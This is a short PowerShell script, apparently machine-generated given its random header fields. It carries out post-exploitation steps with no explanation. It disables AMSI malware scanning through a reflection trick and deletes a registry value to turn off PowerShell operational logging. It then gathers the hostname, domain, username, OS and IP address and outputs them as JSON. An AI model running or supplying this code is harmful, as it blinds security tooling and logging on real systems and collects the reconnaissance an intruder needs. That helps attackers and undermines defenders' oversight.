# QPGq2SmHtLBZ64T7oqTY
# Generated: 2025-11-03T12:20:52.709562
# System: rNjlyvcchEcS7cd
# Process: fegGlNvifT0r


# AMSI Bypass via Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)



# ETW Bypass via Registry
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Winevt\Channels\Microsoft-Windows-PowerShell/Operational" -Name "Enabled" -ErrorAction SilentlyContinue



# System reconnaissance
$systemInfo = @{
    Hostname = $env:COMPUTERNAME
    Domain = $env:USERDOMAIN
    Username = $env:USERNAME
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -eq "Ethernet" -or $_.InterfaceAlias -eq "Wi-Fi"}).IPAddress
}

$systemInfo | ConvertTo-Json
